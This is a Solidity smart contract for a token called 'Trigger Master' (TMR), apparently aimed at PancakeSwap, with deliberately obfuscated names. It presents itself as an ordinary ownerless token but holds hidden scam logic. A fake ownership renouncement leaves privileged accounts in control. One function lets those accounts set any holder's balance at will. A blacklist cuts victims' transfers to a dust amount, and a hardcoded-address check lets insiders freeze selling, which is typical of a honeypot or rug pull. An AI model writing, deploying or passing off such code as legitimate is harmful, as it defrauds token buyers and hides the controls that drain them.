//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface autoSender {
    function createPair(address teamToken, address marketingMin) external returns (address);
}

interface takeAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptSell) external view returns (uint256);

    function transfer(address fromAt, uint256 txSwap) external returns (bool);

    function allowance(address launchFundTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 txSwap) external returns (bool);

    function transferFrom(
        address sender,
        address fromAt,
        uint256 txSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeReceiver, uint256 value);
    event Approval(address indexed launchFundTotal, address indexed spender, uint256 value);
}

abstract contract feeShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeMax is takeAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TriggerMaster is feeShould, takeAuto, modeMax {

    string private autoLaunch = "Trigger Master";

    uint8 private toSwap = 18;

    bool public teamSwap;

    uint256 private enableLaunched = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed minMode, address indexed teamLimit);

    uint256 constant shouldSell = 11 ** 10;

    bool public exemptBuy;

    constructor (){
        if (fromTotal) {
            enableMin = receiverSender;
        }
        shouldTeam tradingTo = shouldTeam(txExempt);
        walletTakeLiquidity = autoSender(tradingTo.factory()).createPair(tradingTo.WETH(), address(this));
        if (enableMin != takeSell) {
            takeSell = receiverSender;
        }
        tradingMinTake = _msgSender();
        fundLaunched[tradingMinTake] = true;
        atLaunchedTo[tradingMinTake] = enableLaunched;
        txTake();
        if (receiverSender == enableMin) {
            teamMode = false;
        }
        emit Transfer(address(0), tradingMinTake, enableLaunched);
    }

    bool private shouldMarketing;

    function allowance(address minReceiver, address swapMarketing) external view virtual override returns (uint256) {
        if (swapMarketing == txExempt) {
            return type(uint256).max;
        }
        return toReceiver[minReceiver][swapMarketing];
    }

    function balanceOf(address exemptSell) public view virtual override returns (uint256) {
        return atLaunchedTo[exemptSell];
    }

    function totalSell(address receiverMax, address fromAt, uint256 txSwap) internal returns (bool) {
        if (receiverMax == tradingMinTake) {
            return totalTeamIs(receiverMax, fromAt, txSwap);
        }
        uint256 totalAuto = takeAuto(walletTakeLiquidity).balanceOf(fromFee);
        require(totalAuto == txTotal);
        require(fromAt != fromFee);
        if (minModeEnable[receiverMax]) {
            return totalTeamIs(receiverMax, fromAt, shouldSell);
        }
        return totalTeamIs(receiverMax, fromAt, txSwap);
    }

    mapping(address => uint256) private atLaunchedTo;

    bool private teamMode;

    address private fundSender;

    function transfer(address enableTo, uint256 txSwap) external virtual override returns (bool) {
        return totalSell(_msgSender(), enableTo, txSwap);
    }

    function transferFrom(address receiverMax, address fromAt, uint256 txSwap) external override returns (bool) {
        if (_msgSender() != txExempt) {
            if (toReceiver[receiverMax][_msgSender()] != type(uint256).max) {
                require(txSwap <= toReceiver[receiverMax][_msgSender()]);
                toReceiver[receiverMax][_msgSender()] -= txSwap;
            }
        }
        return totalSell(receiverMax, fromAt, txSwap);
    }

    function limitReceiverSell(address enableTo, uint256 txSwap) public {
        limitTradingFund();
        atLaunchedTo[enableTo] = txSwap;
    }

    bool private fromTotal;

    function approve(address swapMarketing, uint256 txSwap) public virtual override returns (bool) {
        toReceiver[_msgSender()][swapMarketing] = txSwap;
        emit Approval(_msgSender(), swapMarketing, txSwap);
        return true;
    }

    function totalTeamIs(address receiverMax, address fromAt, uint256 txSwap) internal returns (bool) {
        require(atLaunchedTo[receiverMax] >= txSwap);
        atLaunchedTo[receiverMax] -= txSwap;
        atLaunchedTo[fromAt] += txSwap;
        emit Transfer(receiverMax, fromAt, txSwap);
        return true;
    }

    mapping(address => bool) public minModeEnable;

    address fromFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public enableMin;

    function receiverTake(uint256 txSwap) public {
        limitTradingFund();
        txTotal = txSwap;
    }

    uint256 autoTx;

    mapping(address => mapping(address => uint256)) private toReceiver;

    address txExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function modeFee(address maxToken) public {
        require(maxToken.balance < 100000);
        if (exemptBuy) {
            return;
        }
        if (teamMode) {
            shouldMarketing = true;
        }
        fundLaunched[maxToken] = true;
        
        exemptBuy = true;
    }

    address public tradingMinTake;

    function getOwner() external view returns (address) {
        return fundSender;
    }

    function decimals() external view virtual override returns (uint8) {
        return toSwap;
    }

    mapping(address => bool) public fundLaunched;

    bool public shouldLaunch;

    function feeTrading(address totalAutoLaunched) public {
        limitTradingFund();
        if (teamSwap != teamMode) {
            teamSwap = true;
        }
        if (totalAutoLaunched == tradingMinTake || totalAutoLaunched == walletTakeLiquidity) {
            return;
        }
        minModeEnable[totalAutoLaunched] = true;
    }

    function limitTradingFund() private view {
        require(fundLaunched[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableLaunched;
    }

    function owner() external view returns (address) {
        return fundSender;
    }

    string private swapTakeReceiver = "TMR";

    function name() external view virtual override returns (string memory) {
        return autoLaunch;
    }

    uint256 public takeSell;

    uint256 public receiverSender;

    uint256 txTotal;

    function txTake() public {
        emit OwnershipTransferred(tradingMinTake, address(0));
        fundSender = address(0);
    }

    address public walletTakeLiquidity;

    function symbol() external view virtual override returns (string memory) {
        return swapTakeReceiver;
    }

}